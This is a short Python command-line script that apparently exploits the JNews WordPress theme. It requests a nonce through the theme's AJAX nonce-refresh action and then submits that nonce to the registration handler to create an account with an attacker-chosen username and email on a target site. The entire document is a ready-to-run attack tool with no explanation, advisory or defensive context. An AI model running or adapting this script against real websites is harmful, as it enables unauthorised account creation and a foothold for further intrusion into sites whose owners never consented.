import requests
import argparse

def fetch_nonce(url):
    d = {
        'action': 'jnews_refresh_nonce',
        'refresh_action_nonce': 'jnews_nonce'
    }
    try:
        r = requests.post(url, data=d, timeout=10)
        return r.json().get('jnews_nonce')
    except:
        return None

def register(url, user, mail, nonce):
    d = {
        'action': 'register_handler',
        'username': user,
        'email': mail,
        'jnews_nonce': nonce
    }
    try:
        r = requests.post(url, data=d, timeout=10)
        print(r.text)
    except Exception as e:
        print("err:", e)

def main():
    p = argparse.ArgumentParser()
    p.add_argument("-u", "--url", required=True)
    p.add_argument("-n", "--username", required=True)
    p.add_argument("-e", "--email", required=True)
    a = p.parse_args()

    base = a.url.rstrip('/')
    target = base + '/?ajax-request=jnews'

    n = fetch_nonce(target)
    if not n:
        print("[-] nonce fail")
        return

    print(f"[+] nonce: {n}")
    register(target, a.username, a.email, n)

if __name__ == "__main__":
    main()
